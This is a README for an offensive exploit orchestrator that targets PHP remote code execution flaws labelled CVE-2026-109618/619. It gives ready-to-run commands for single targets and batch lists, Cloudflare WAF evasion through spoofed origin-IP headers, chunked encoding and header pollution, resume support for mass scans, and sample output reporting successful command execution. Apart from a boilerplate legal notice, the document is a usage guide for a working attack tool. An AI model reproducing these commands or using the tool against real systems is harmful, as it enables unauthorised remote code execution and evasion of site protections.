# php2shellX

Next-generation exploit orchestrator for CVE-2026-109618/619 — adds Cloudflare WAF bypass, flexible target specification (URL/host/port/path/batch), multi-format output (JSON/CSV/table), resume capability, and lab automation (Docker restart). Authored by TESTERXMA.
# php2shell Enhanced Exploit Orchestrator

**Author: TESTERXMA**

Enhanced version of the php2shell exploit (CVE-2026-109618 / CVE-2026-109619) with:
- **Cloudflare WAF Bypass** - Header obfuscation, request fragmentation, encoding evasion
- **Custom Target Support** - Flexible URL/host/port/path specification
- **Batch Scanning** - Multiple targets from file
- **Advanced Fingerprinting** - WAF detection, PHP version, vulnerability assessment
- **Multiple Output Formats** - JSON, CSV, Table
- **Resume Capability** - Save/restore progress
- **Lab Integration** - Docker container restart support

---

## Quick Start

```bash
# Single target with Cloudflare bypass
python3 exploit_enhanced.py --url "https://target.example.com/index.php" --waf-bypass

# Custom host/port/path
python3 exploit_enhanced.py --host 10.10.10.50 --port 8080 --path /vuln.php --cmd "id"

# Batch mode from file
python3 exploit_enhanced.py --batch targets.txt --output results.json

# Lab environment with Docker restart
python3 exploit_enhanced.py --url http://lab.local --restart php2shell-container

# Resume interrupted run
python3 exploit_enhanced.py --url http://target --resume progress.json
```

---

## Target Specification

| Option | Description | Example |
|--------|-------------|---------|
| `--url` | Full URL (scheme://host:port/path) | `https://example.com/vuln.php` |
| `--host` + `--port` + `--path` | Individual components | `--host 10.10.10.5 --port 8080 --path /shell.php` |
| `--batch` | File with targets (one per line) | `targets.txt` |

**Batch file format:**
```
10.10.10.10
10.10.10.20:8080
https://lab.example.com/vuln.php
http://192.168.1.50:8443/index.php
# comments supported
```

---

## Cloudflare WAF Bypass

Enable with `--waf-bypass`. The module:

1. **Detects** Cloudflare presence and challenge type (JS challenge, Managed challenge, Block)
2. **Applies** evasion techniques:
   - Origin IP spoofing (`X-Forwarded-For`, `CF-Connecting-IP`, etc.)
   - Chunked transfer encoding
   - Header case variation
   - Parameter pollution (duplicate headers)
   - Slow request fragmentation
   - Cache bypass headers
3. **Reports** WAF profile in results

```bash
# With verbose WAF detection
python3 exploit_enhanced.py --url https://target.com --waf-bypass -v
```

---

## Exploit Options

| Option | Default | Description |
|--------|---------|-------------|
| `--cmd` | `id` | Command to execute on target |
| `--expect` | - | Expected output bytes for success detection |
| `--call` | - | `zend_call_function` address (hex) |
| `--dtor` | - | `zval_ptr_dtor` address (hex) |
| `--stall` | `1.5` | Stall duration between phases |
| `--monitor` | off | Monitor upload progress endpoint |
| `--progress-path` | `/check_progress.php` | Progress check path |
| `--rounds` | `1` | Trigger attempts per target |
| `--timeout` | `30` | Request timeout (seconds) |
| `--retries` | `3` | Retry attempts on failure |
| `--arch` | `auto` | Target architecture (auto/x86_64/aarch64) |
| `--workers` | `150` | Prefork MaxRequestWorkers (1 = no pinning) |

---

## Lab Environment

```bash
# Restart Docker container before exploit
python3 exploit_enhanced.py --url http://lab.local --restart php2shell-container

# Custom docker command
python3 exploit_enhanced.py --url http://lab.local --restart container --docker-cmd "docker"
```

---

## Output Formats

| Format | Flag | Description |
|--------|------|-------------|
| JSON | `--format json` | Full structured results (default) |
| CSV | `--format csv` | Spreadsheet-compatible |
| Table | `--format table` | Human-readable summary |

```bash
# JSON (default)
python3 exploit_enhanced.py --url http://target -o results.json

# CSV for analysis
python3 exploit_enhanced.py --batch targets.txt --format csv -o results.csv

# Table view
python3 exploit_enhanced.py --batch targets.txt --format table
```

---

## Resume Capability

Save progress during long batch runs:

```bash
# Save progress every target
python3 exploit_enhanced.py --batch targets.txt --resume progress.json

# Resume after interrupt
python3 exploit_enhanced.py --batch targets.txt --resume progress.json
```

---

## Custom Headers

Add arbitrary headers (repeatable):

```bash
python3 exploit_enhanced.py --url http://target \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "User-Agent: CustomAgent/1.0" \
  -H "X-Custom: value"
```

---

## Example Output

**Table format:**
```
================================================================================
TARGET                                      STATUS     PHP        WAF        RESULT
--------------------------------------------------------------------------------
http://10.10.10.10:80/                      SUCCESS    8.4.26     bypass     SUCCESS
https://lab.example.com:443/vuln.php        FAILED     8.3.12     none       FAILED
================================================================================
```

**JSON structure:**
```json
{
  "target": "https://target.com/vuln.php",
  "cves": ["CVE-2026-109618", "CVE-2026-109619"],
  "author": "TESTERXMA",
  "timestamp": "2026-10-25 14:30:00",
  "config": { "waf_bypass": true, "port": 443, "scheme": "https" },
  "fingerprint": {
    "php_version": "8.4.26",
    "likely_vulnerable": true,
    "waf": { "detected": true, "challenge_type": "managed_challenge", "confidence": 85.0 }
  },
  "chain_618": [...],
  "chain_619": {...},
  "success": true,
  "proof": "Command executed: id"
}
```

---

## Requirements

- Python 3.8+
- Original php2shell_core.py and pure/ modules in same directory
- Network access to target

---

## Legal Notice

**Authorized testing only.** This tool is for educational purposes and authorized penetration testing within scope. Unauthorized use against systems you do not own or have explicit permission to test is illegal.

---

## Changelog

- **v2.0** (TESTERXMA): Cloudflare WAF bypass, batch mode, custom targets, resume, multi-format output
